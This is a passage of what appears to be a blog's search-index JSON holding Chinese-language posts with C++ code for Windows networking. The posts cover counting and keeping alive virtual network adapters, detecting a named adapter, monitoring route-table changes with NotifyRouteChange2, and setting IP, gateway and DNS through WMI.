程序输出如下所示：","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"driver","slug":"driver","permalink":"http://example.com/tags/driver/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"驱动","slug":"A-OS/Windows/驱动","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/"},{"name":"EasyDriver","slug":"A-OS/Windows/驱动/EasyDriver","permalink":"http://example.com/categories/A-OS/Windows/%E9%A9%B1%E5%8A%A8/EasyDriver/"}]},{"title":"【Windows】获取网卡数量","date":"2023-10-27T01:24:02.078Z","path":"A_OS/Windows/网络helper/获取网卡数量/","text":"概述：获取虚拟网卡的个数、网卡保活、判断网卡是否存在 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455int GetNetCardNums()&#123; int nRet = 0; CoInitialize(NULL); INetConnectionManager* pNetManager; INetConnection* pNetConnection; IEnumNetConnection* pEnum; ULONG celtFetched; std::string strComGuid; NETCON_PROPERTIES* properties = nullptr; bool bIsInstalledNcCard = false; TapReg setRegGuid = get_tap_reg(); NcStatusList ncStausList; if (setRegGuid.size() == 0) &#123; SP_LOGW(&quot;%s Reg Not Found, Re Install&quot;, __SP_FUNC__); return 0; &#125; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; SP_LOGW(&quot;%s Com Instance Failed, sleep(5s)&quot;, __SP_FUNC__); return 0; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); pNetManager-&gt;Release(); if (NULL == pEnum) &#123; return 0; &#125; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; pNetConnection-&gt;GetProperties(&amp;properties); strComGuid = GUIDToString(properties-&gt;guidId); // 查看当前网卡与注册表的guid一致时的状态 for (auto&amp; it : setRegGuid) &#123; // #1 判断是否安装了 虚拟网卡 if (strComGuid.compare(it) == 0) &#123; nRet++; &#125; &#125; &#125; pEnum-&gt;Release(); return nRet;&#125; 网卡保活声明 1234567/** @fn keepAlive* @brief 网络连接保活** @detail 线程，通过COM组件实现*/void keepDeviceTAVnicAlive(); 实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159void keepDeviceTAVnicAlive()&#123; std::lock_guard&lt;std::mutex&gt; lock(g_mutex); bool bRet = false; static int iRePtunFlag = 1; // Nc重连标志 static int iReLoadFlag = 1; // Dll重载标志 // ipc 主要处理nc发送的消息 TrustSpaceIPCUtil m_ncIpc(&quot;trustNcToCore&quot;); m_ncIpc.Initialize(&amp;HandleIpcCallBack); do &#123; CoInitialize(NULL); INetConnectionManager* pNetManager = nullptr; INetConnection* pNetConnection = nullptr; IEnumNetConnection* pEnum = nullptr; ULONG celtFetched; std::string strComGuid; bool bIsInstalledNcCard = false; TapReg setRegGuid = get_tap_reg(); NcStatusList ncStausList; if (setRegGuid.size() == 0) &#123; SP_LOGW(&quot;%s Reg Not Found, Re Install&quot;, __SP_FUNC__); goto __REINSTALL; &#125; if (S_OK != CoCreateInstance(CLSID_ConnectionManager, NULL, CLSCTX_SERVER, IID_INetConnectionManager, (void**)&amp;pNetManager)) &#123; SP_LOGW(&quot;%s Com Instance Failed, sleep(5s)&quot;, __SP_FUNC__); std::this_thread::sleep_for(std::chrono::milliseconds(1000 * 5)); continue; &#125; pNetManager-&gt;EnumConnections(NCME_DEFAULT, &amp;pEnum); if (pNetManager) &#123; pNetManager-&gt;Release(); pNetManager = nullptr; &#125; if (NULL == pEnum) &#123; return; &#125; while (pEnum-&gt;Next(1, &amp;pNetConnection, &amp;celtFetched) == S_OK) &#123; NETCON_PROPERTIES* properties = nullptr; pNetConnection-&gt;GetProperties(&amp;properties); if (properties != nullptr) &#123; strComGuid = GUIDToString(properties-&gt;guidId); // T1 查看当前网卡与注册表的guid一致时的状态 for (auto&amp; it : setRegGuid) &#123; // #1 判断是否安装了 虚拟网卡 int minSize = min(strComGuid.size(), it.size()); if (it.compare(0, minSize, strComGuid, 0, minSize) == 0) &#123; ncStausList[properties-&gt;Status] = properties-&gt;pszwDeviceName; // #2 已安装 bIsInstalledNcCard = true; // #3 判断是否被禁用 if (NCS_DISCONNECTED == properties-&gt;Status) &#123; pNetConnection-&gt;Connect(); SP_LOGI(&quot;%s [NcCard] ReConnect&quot;, __SP_FUNC__); &#125; &#125; &#125; &#125; if (pNetConnection) &#123; pNetConnection-&gt;Release(); pNetConnection = nullptr; &#125; &#125; if (pEnum) &#123; pEnum-&gt;Release(); pEnum = nullptr; &#125; // T2 网卡启用时，判断是否有业务需要开启 if (g_sp_trust_model &amp;&amp; g_sp_trust_model-&gt;Session()-&gt;NeedsL3Tunnel() &amp;&amp; // 有三层业务 !g_sp_trust_model-&gt;Session()-&gt;IsTunnelSvrsEmpty() &amp;&amp; // 服务不为空 g_sp_trust_model-&gt;Session()-&gt;IsOnline() &amp;&amp; // 会话在线 g_bNetWorkOnline) // 必须联网 &#123; iRePtunFlag = (iRePtunFlag &gt; 300) ? 0 : ++iRePtunFlag; if (ncStausList.find(NCS_CONNECTED) == ncStausList.end() &amp;&amp; (iRePtunFlag % 30 == 0)) &#123; SP_LOGI(&quot;%s [NcCard] Auto Detect ReConnect PTUN&quot;, __SP_FUNC__); if (iReLoadFlag == 5) &#123; SP_LOGI(&quot;%s [NcCard] Auto Detect ReConnect PTUN FAILED. RUN TIMES OVER 5, NECT:[NO OPTION]&quot;, __SP_FUNC__); &#125; handleReStartNc(); Sleep(5 * 1000); iReLoadFlag++; &#125; else if (ncStausList.find(NCS_CONNECTED) != ncStausList.end()) &#123; iReLoadFlag = 0; &#125; &#125; __REINSTALL: CoUninitialize(); if (false == bIsInstalledNcCard) // 未安装，重新安装 &#123; // #1 未安装，重新安装 if (false == bIsInstalledNcCard) &#123; SP_DEV_LOGW(&quot;[NetCard] Detect Nc Card Not Installed&quot;); // #2 重新安装 bIsInstalledNcCard = true; std::thread installCardThread([] &#123; g_sp_trust_model-&gt;NotifyUpMessage(SP_TRUST_TOPIC_MSG_NC_INSTALL, SPJSONObject(), 100); &#125;); installCardThread.detach(); // #3 等待客户端安装 Sleep(15 * 1000); &#125; &#125; else &#123; Sleep(1 * 1000); // 每一秒检查一次 &#125; &#125; while (true); return;&#125; 网卡是否存在12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485bool IsExistNcCard()&#123; bool bIsExist = false; int nNetCardSize = 20; std::shared_ptr&lt;IP_ADAPTER_INFO&gt; pIpAdapterInfo(new IP_ADAPTER_INFO[nNetCardSize]); unsigned long stSize = sizeof(IP_ADAPTER_INFO) * nNetCardSize; //获取所有网卡信息，参数二为输入输出参数 int nRel = GetAdaptersInfo(pIpAdapterInfo.get(), &amp;stSize); // 空间不足 if (ERROR_BUFFER_OVERFLOW == nRel) &#123; pIpAdapterInfo.reset(new IP_ADAPTER_INFO[stSize]); if (GetAdaptersInfo(pIpAdapterInfo.get(), &amp;stSize) != NO_ERROR) &#123; std::cout &lt;&lt; &quot;Failed to get adapter info&quot; &lt;&lt; std::endl; return false; &#125; &#125; PIP_ADAPTER_INFO cur = pIpAdapterInfo.get(); // 多个网卡 通过链表形式链接起来的 std::string netdesc; std::string netip; while (cur) &#123; netdesc = cur-&gt;Description; switch (cur-&gt;Type) &#123; case MIB_IF_TYPE_OTHER: break; case MIB_IF_TYPE_ETHERNET: &#123; IP_ADDR_STRING* pIpAddrString = &amp;(cur-&gt;IpAddressList); netip = pIpAddrString-&gt;IpAddress.String; &#125; break; case MIB_IF_TYPE_TOKENRING: break; case MIB_IF_TYPE_FDDI: break; case MIB_IF_TYPE_PPP: break; case MIB_IF_TYPE_LOOPBACK: break; case MIB_IF_TYPE_SLIP: break; default://无线网卡,Unknown type &#123; IP_ADDR_STRING* pIpAddrString = &amp;(cur-&gt;IpAddressList); netip = pIpAddrString-&gt;IpAddress.String; &#125; break; &#125; char hex[16] = &#123; &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27; &#125;; // mac 地址一般6个字节 // mac 二进制转16进制字符串 char macStr[18] = &#123; 0 &#125;;//12+5+1 int k = 0; for (UINT j = 0; j &lt; cur-&gt;AddressLength; j++) &#123; macStr[k++] = hex[(cur-&gt;Address[j] &amp; 0xf0) &gt;&gt; 4]; macStr[k++] = hex[cur-&gt;Address[j] &amp; 0x0f]; macStr[k++] = &#x27;-&#x27;; &#125; if (k &lt; 18 &amp;&amp; k &gt; 0) &#123; macStr[k - 1] = 0; &#125; cur = cur-&gt;Next; // 找到 &quot;TrustAgent VNIC&quot; if (netdesc.find(&quot;TrustAgent VNIC&quot;) != std::string::npos) &#123; bIsExist = true; goto _END_; &#125; &#125;_END_: return bIsExist;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"网卡","slug":"网卡","permalink":"http://example.com/tags/%E7%BD%91%E5%8D%A1/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】网络连接事件","date":"2023-10-27T01:24:02.077Z","path":"A_OS/Windows/网络helper/网络连接事件/","text":"","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】监控路由事件","date":"2023-10-27T01:24:02.076Z","path":"A_OS/Windows/网络helper/监控路由事件/","text":"相关文章： 使用winsock2 说明监控网卡可以使用 NotifyRouteChange 和 NotifyRouteChange2 函数，通过注册回调实现路由监控 主要步骤 声明一个回调函数处理通知 调用notifyRouteChange2注册通知,指定通知类型 等待通知 取消通知(可选) 在回调函数中根据通知类型进行处理 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144#ifndef WIN32_LEAN_AND_MEAN#define WIN32_LEAN_AND_MEAN#endif#define _WINSOCK_DEPRECATED_NO_WARNINGS#include &lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;string&gt;#include &lt;windows.h&gt;#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iphlpapi.h&gt;#pragma comment(lib, &quot;iphlpapi.lib&quot;)#pragma comment(lib, &quot;ws2_32.lib&quot;)using namespace std;#define NAMEPRINTFORMAT(X) std::left &lt;&lt; setw(60)&lt;&lt; #X &lt;&lt; &quot;\\t\\t&quot; &lt;&lt; Xstd::string ipToString(DWORD dwIP)&#123; std::string strDestIp = &quot;&quot;; std::string strMaskIp = &quot;&quot;; struct in_addr network; network.S_un.S_addr = dwIP; //为s_addr赋值--网络字节序 strDestIp = inet_ntoa(network); return strDestIp;&#125;void CALLBACK RouteChanged1(void* CallerContext, PMIB_IPFORWARD_ROW2 Table, MIB_NOTIFICATION_TYPE NotificationType)&#123; using context = void(*)(DWORD); context ctx = (context)CallerContext; auto PrintTable = [](MIB_IPFORWARD_ROW2 table) &#123; cout &lt;&lt; &quot;---------------&quot; &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.IfType) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.NetLuidIndex) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Info.Reserved) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceLuid.Value) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.InterfaceIndex) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.si_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; &quot;\\t&quot; &lt;&lt; ipToString(table.DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_port) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv4.sin_zero) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_addr.u.Byte) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_addr.u.Word) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_family) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_flowinfo) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_port) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_id) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Level) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Value) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.DestinationPrefix.Prefix.Ipv6.sin6_scope_struct.Zone) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; &quot;\\t&quot; &lt;&lt; ipToString(table.NextHop.Ipv4.sin_addr.S_un.S_addr) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv6.sin6_addr.u.Byte) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.NextHop.Ipv6.sin6_addr.u.Word) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.SitePrefixLength) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.ValidLifetime) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.PreferredLifetime) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Metric) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Protocol) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Loopback) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.AutoconfigureAddress) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Immortal) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Age) &lt;&lt; endl; cout &lt;&lt; NAMEPRINTFORMAT(table.Origin) &lt;&lt; endl; cout &lt;&lt; &quot;---------------&quot; &lt;&lt; endl &lt;&lt; endl; &#125;; // 处理路由表变更通知 switch (NotificationType) &#123; case MibParameterNotification: cout &lt;&lt; &quot;1-- 参数被更改&quot; &lt;&lt; endl; break; case MibAddInstance: cout &lt;&lt; &quot;2-- 添加&quot; &lt;&lt; endl; PrintTable(*Table); ctx(Table-&gt;DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr); break; case MibDeleteInstance: cout &lt;&lt; &quot;3-- 删除&quot; &lt;&lt; endl; PrintTable(*Table); ctx(Table-&gt;DestinationPrefix.Prefix.Ipv4.sin_addr.S_un.S_addr); break; case MibInitialNotification: cout &lt;&lt; &quot;4-- 函数已注册&quot; &lt;&lt; endl; break; default: break; &#125;&#125;void checkIsMyRoute (DWORD ip)&#123; cout &lt;&lt; NAMEPRINTFORMAT(ipToString(ip)) &lt;&lt; endl;&#125;;void main()&#123; HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL); HANDLE hNotify = NULL; PVOID callerContext = static_cast&lt;PVOID&gt;(&amp;checkIsMyRoute); BOOLEAN bSuccess = TRUE; ULONG pdwPrevNotified = 0; if (callerContext != nullptr &amp;&amp; NotifyRouteChange2(AF_UNSPEC, &amp;RouteChanged1, callerContext, bSuccess, &amp;hNotify) != NO_ERROR) &#123; printf(&quot;Could not register for route change notifications\\n&quot;); return ; &#125; while (TRUE) &#123; DWORD dwWait = WaitForSingleObject(hNotify, INFINITE); if (dwWait == WAIT_OBJECT_0) &#123; // 接收到异步通知，处理结果 break; &#125; &#125; // 取消监控 CancelMibChangeNotify2(hNotify); CloseHandle(hNotify); return ;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"监控","slug":"监控","permalink":"http://example.com/tags/%E7%9B%91%E6%8E%A7/"},{"name":"route","slug":"route","permalink":"http://example.com/tags/route/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"网络helper","slug":"A-OS/Windows/网络helper","permalink":"http://example.com/categories/A-OS/Windows/%E7%BD%91%E7%BB%9Chelper/"}]},{"title":"【Windows】操作网卡类","date":"2023-10-27T01:24:02.075Z","path":"A_OS/Windows/网络helper/操作网卡类/","text":"概述：在 windows 环境下，使用 wmi 修改网卡 ip+dns main.cpp12345678910111213141516171819202122232425262728293031323334353637383940414243444546//main.cpp:#include &lt;iostream&gt;#include &lt;locale&gt;#include &lt;string&gt;#include &lt;codecvt&gt;#include &quot;net_config.h&quot;#pragma execution_character_set(&quot;utf-8&quot;)using namespace std;int main()&#123; std::locale::global(std::locale(&quot;&quot;)); NetConfig config; //网卡的key可以从注册表获取, 路径: 计算机\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\ config.set_key(&quot;&#123;cd574b17-73e1-42df-a50c-f95d7f15c1d0&#125;&quot;); //设置静态ip之前要调用下enable_dhcp, 可以把以前设置的ip和网关都清空, 否则注册表会有多个ip信息 if (config.enable_dhcp()) &#123; cout &lt;&lt; &quot;enable_dhcp success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; if (config.set_ip_config(&quot;192.168.1.100&quot;, &quot;255.255.255.0&quot;, &quot;192.168.1.1&quot;)) &#123; cout &lt;&lt; &quot;set_ip_config success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; if (config.set_dns(&quot;255.255.255.0&quot;, &quot;&quot;)) &#123; cout &lt;&lt; &quot;set_dns success&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;error code: &quot; &lt;&lt; config.get_last_error_code() &lt;&lt; endl; &#125; cin.get(); return 0;&#125; net_config.h12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364//net_config.h#pragma once#include &lt;string&gt;#include &lt;memory&gt;#include &lt;vector&gt;#include &lt;Wbemidl.h&gt;class NetConfig&#123;public: NetConfig() &#123;&#125; NetConfig(const std::string &amp;key) :key_(key)&#123; &#125; ~NetConfig(); //设置网络设备GUID void set_key(const std::string &amp;key) &#123; clear(); key_ = key; &#125; //启用DHCP bool enable_dhcp(); //启动静态IP,设置IP,掩码,网关 bool set_ip_config(const std::string &amp;ip, const std::string &amp;mask, const std::string &amp;gateway); bool set_ip_config(const std::string &amp;ip, const std::string &amp;mask); //设置网关 bool set_gateway(const std::string &amp;gateway); //设置DNS地址 bool set_dns(const std::string &amp;default_dns, const std::string &amp;backup_dns); //设置自动DNS bool set_auto_dns(); int get_last_error_code()const &#123; return last_error_code_; &#125; void clear();private: NetConfig(const NetConfig &amp;rhs) = delete; NetConfig &amp;operator = (const NetConfig &amp;rhs) = delete;private: //初始化 bool init(); //创建COM数组 std::shared_ptr&lt;SAFEARRAY&gt; create_SAFEARRAY(const std::vector&lt;std::string&gt; &amp;args); bool set_dns_base(bool is_auto, const std::string &amp;default_dns, const std::string &amp;backup_dns); bool exec_method(const wchar_t *method, IWbemClassObject *params_instance);private: std::string key_; bool is_init_ = false; IWbemLocator* p_instance_ = NULL; IWbemServices* p_service_ = NULL; IEnumWbemClassObject* p_enum_ = NULL; IWbemClassObject *p_obj_ = NULL; IWbemClassObject *p_config = NULL; VARIANT path_; int last_error_code_ = 0;&#125;; net_config.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367//net_config.cpp#include &quot;net_config.h&quot;#include &lt;codecvt&gt;#include &lt;atlbase.h&gt;#include &lt;comutil.h&gt;#ifdef _DEBUG#include &lt;iostream&gt;#endif#pragma comment(lib, &quot;wbemuuid.lib&quot;)#pragma comment(lib, &quot;comsuppw.lib&quot;)#pragma execution_character_set(&quot;utf-8&quot;)using namespace std;NetConfig::~NetConfig()&#123; clear();&#125;bool NetConfig::enable_dhcp()&#123; if (!init()) return false; return exec_method(L&quot;EnableDHCP&quot;, NULL);&#125;bool NetConfig::set_ip_config(const std::string &amp; ip, const std::string &amp; mask, const std::string &amp; gateway)&#123; if (set_ip_config(ip, mask)) &#123; return set_gateway(gateway); &#125; return false;&#125;bool NetConfig::set_ip_config(const std::string &amp; ip, const std::string &amp; mask)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;EnableStatic&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); auto p1 = create_SAFEARRAY(&#123; ip &#125;); VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;IPAddress&quot;, 0, &amp;paramVt, NULL); p1 = create_SAFEARRAY(&#123; mask &#125;); paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;SubnetMask&quot;, 0, &amp;paramVt, NULL); rt = exec_method(L&quot;EnableStatic&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;bool NetConfig::set_dns(const std::string &amp; default_dns, const std::string &amp; backup_dns)&#123; return set_dns_base(false, default_dns, backup_dns);&#125;bool NetConfig::set_auto_dns()&#123; return set_dns_base(true, &quot;&quot;, &quot;&quot;);&#125;bool NetConfig::set_gateway(const std::string &amp; gateway)&#123; bool rt = false; if (!init()) return rt; IWbemClassObject *params = NULL; IWbemClassObject *paramsInst = NULL; p_config-&gt;GetMethod(_bstr_t(&quot;SetGateways&quot;), 0, &amp;params, NULL); params-&gt;SpawnInstance(0, &amp;paramsInst); auto p1 = create_SAFEARRAY(&#123; gateway &#125;); VARIANT paramVt; paramVt.vt = VT_ARRAY | VT_BSTR; paramVt.parray = p1.get(); paramsInst-&gt;Put(L&quot;DefaultIPGateway&quot;, 0, &amp;paramVt, NULL); paramVt.vt = VT_UINT; paramVt.uintVal = 1; paramsInst-&gt;Put(L&quot;GatewayCostMetric&quot;, 0, &amp;paramVt, NULL); rt = exec_method(L&quot;SetGateways&quot;, paramsInst); if (params) &#123; params-&gt;Release(); &#125; return rt;&#125;void NetConfig::clear()&#123; if (p_config) &#123; p_config-&gt;Release(); p_config = nullptr; &#125; if (p_obj_) &#123; p_obj_-&gt;Release(); p_obj_ = nullptr; &#125; if (p_enum_) &#123; p_enum_-&gt;Release(); p_enum_ = nullptr; &#125; if (p_service_) &#123; p_service_-&gt;Release(); p_service_ = nullptr; &#125; if (p_instance_) &#123; p_instance_-&gt;Release(); p_instance_ = nullptr; &#125; if (is_init_) &#123; CoUninitialize(); &#125; is_init_ = false;&#125;bool NetConfig::init()&#123; if (is_init_) &#123; return true; &#125; // Step 1: Initialize COM. HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoInitializeEx failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; /* // Step 2: Set general COM security levels hres = CoInitializeSecurity( NULL, -1, // COM negotiates service NULL, // Authentication services NULL, // Reserved RPC_C_AUTHN_LEVEL_DEFAULT, // Default authentication RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation NULL, // Authentication info EOAC_NONE, // Additional capabilities NULL // Reserved ); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoInitializeSecurity failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoInitializeSecurity failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; */ // Step 3: Obtain the initial locator to WMI hres = CoCreateInstance( CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&amp;p_instance_); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoCreateInstance failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoCreateInstance failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Step 4: Connect to the local root\\cimv2 namespace and obtain pointer pSvc to make IWbemServices calls. hres = p_instance_-&gt;ConnectServer( _bstr_t(L&quot;ROOT\\\\CIMV2&quot;), NULL, NULL, 0, NULL, 0, 0, &amp;p_service_ ); //ASSERT_THROW(SUCCEEDED(hres), &quot;ConnectServer failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;ConnectServer failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Step 5: Set security levels for the proxy hres = CoSetProxyBlanket( p_service_, // Indicates the proxy to set RPC_C_AUTHN_WINNT, // RPC_C_AUTHN_xxx RPC_C_AUTHZ_NONE, // RPC_C_AUTHZ_xxx NULL, // Server principal name RPC_C_AUTHN_LEVEL_CALL, // RPC_C_AUTHN_LEVEL_xxx RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx NULL, // client identity EOAC_NONE // proxy capabilities ); //ASSERT_THROW(SUCCEEDED(hres), &quot;CoSetProxyBlanket failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;CoSetProxyBlanket failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // 通过适配器名称来找到指定的适配器对象. CComBSTR TheQuery = L&quot;SELECT * FROM Win32_NetworkAdapterConfiguration WHERE SettingID = \\&quot;&quot;; std::wstring_convert&lt;std::codecvt_utf8_utf16&lt;wchar_t&gt;, wchar_t&gt; conversion; TheQuery += conversion.from_bytes(key_).c_str(); TheQuery += L&quot;\\&quot;&quot;; hres = p_service_-&gt;ExecQuery( //SysAllocString(L&quot;WQL&quot;), L&quot;WQL&quot;, TheQuery, WBEM_FLAG_RETURN_IMMEDIATELY | WBEM_FLAG_FORWARD_ONLY, NULL, &amp;p_enum_); //ASSERT_THROW(SUCCEEDED(hres), &quot;ExecQuery failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;ExecQuery failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; // Get the adapter object. ULONG num = 0; hres = p_enum_-&gt;Next(WBEM_INFINITE, 1, &amp;p_obj_, &amp;num); //ASSERT_THROW(SUCCEEDED(hres), &quot;Next failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Next failed: &quot; &lt;&lt; hres &lt;&lt; endl;#endif return false; &#125; //ASSERT_THROW(0 &lt; num, &quot;Next failed&quot;); if (num &lt; 1) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Next failed num &lt; 1&quot; &lt;&lt; endl;#endif return false; &#125; VariantInit(&amp;path_); hres = p_obj_-&gt;Get(L&quot;__PATH&quot;, 0, &amp;path_, NULL, NULL); //ASSERT_THROW(SUCCEEDED(hres), &quot;Get path failed&quot;); if (FAILED(hres)) &#123;#ifdef _DEBUG cout &lt;&lt; &quot;Get failed: &quot; 